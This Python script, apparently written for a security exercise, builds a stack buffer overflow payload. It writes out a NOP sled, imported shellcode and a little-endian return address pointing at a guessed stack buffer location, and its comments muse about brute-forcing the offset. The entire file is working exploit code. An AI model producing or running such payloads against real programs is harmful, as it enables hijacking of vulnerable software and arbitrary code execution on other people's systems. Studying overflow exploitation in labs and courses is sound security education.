#!/usr/bin/env python3

import sys

from shellcode import shellcode
#put in the shellcode into the buffer then brute force the offset?
# maybe try a nop sled where so put nops before the shellcode so within the code it will slide down to the shellcode at a guessed address of the stack 

rbp = 0x7ffffff6b4d0 #approximate start of stack address 
offset = 1032 #distance from start of the buffer to the return address rbp-0x400 - rbp +8
buffer_add = rbp - 0x400
nop_sled_size = offset - len(shellcode)
target_address = buffer_add 


payload = b'\x90' * (nop_sled_size)
payload += shellcode
payload += target_address.to_bytes(8, 'little')
sys.stdout.buffer.write(payload)

